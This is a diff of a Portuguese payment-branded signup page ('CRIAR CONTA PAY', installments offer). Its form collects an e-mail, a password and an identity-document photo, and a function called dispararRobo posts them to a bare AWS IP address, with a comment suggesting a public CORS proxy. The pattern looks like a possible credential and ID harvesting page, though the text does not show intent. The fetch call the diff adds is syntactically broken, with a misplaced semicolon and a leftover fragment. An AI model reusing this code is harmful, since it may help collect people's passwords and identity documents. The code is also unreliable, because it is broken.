@@ -41,13 +41,10 @@
             <p style="font-size: 0.8rem; margin-bottom: 15px; color: #ccc;">EM 4X SEM JUROS</p>
 
             
-            <input type="text" id="e-mail" placeholder="Seu E-MAIL" maxlength="99">
-            <input type="text" id="senha" placeholder="Seu SENHA" maxlength="99">
-
-            <div id="sessao-cadastro" style="display: block; text-align: center;">
-    <input type="email" id="email_acesso" placeholder="Seu melhor e-mail" style="width: 100%; margin-bottom: 10px; padding: 10px;">
-    <input type="password" id="senha_acesso" placeholder="Crie uma senha" style="width: 100%; margin-bottom: 10px; padding: 10px;">
-    <button type="button" onclick="proximaEtapa()" style="background-color: #ffa500; font-weight: bold; width: 100%; padding: 12px; cursor: pointer;">CRIAR CONTA V12</button>
+          <div id="sessao-cadastro" style="display: block; text-align: center;">
+    <input type="email" id="email_acesso" placeholder="Seu E-MAIL" style="width: 100%; margin-bottom: 10px; padding: 10px;">
+    <input type="password" id="senha_acesso" placeholder="Crie Sua SENHA" style="width: 100%; margin-bottom: 10px; padding: 10px;">
+    <button type="button" onclick="proximaEtapa()" style="background-color: #ffa500; font-weight: bold; width: 100%; padding: 12px; cursor: pointer;">CRIAR CONTA PAY</button>
 </div>
 
 <div id="fluxo-cadastro" style="display: none;">
@@ -101,8 +98,7 @@ async function dispararRobo() {
     formData.append('foto_doc', document.getElementById('foto_doc').files[0]);
 
     try {
-        const response = await fetch(// No seu fetch, use o IP público da sua AWS
-const url = 'http://54.207.222.79:5000/gerar-link-total'; 
+        const response = await fetch('http://54.207.222.79:5000/gerar-link-total'; 
 
 // Se o erro de conexão persistir no console, tente usar este proxy para teste:
 // const url = 'https://cors-anywhere.herokuapp.com/http://54.207.222.79:5000/gerar-link-total';', {
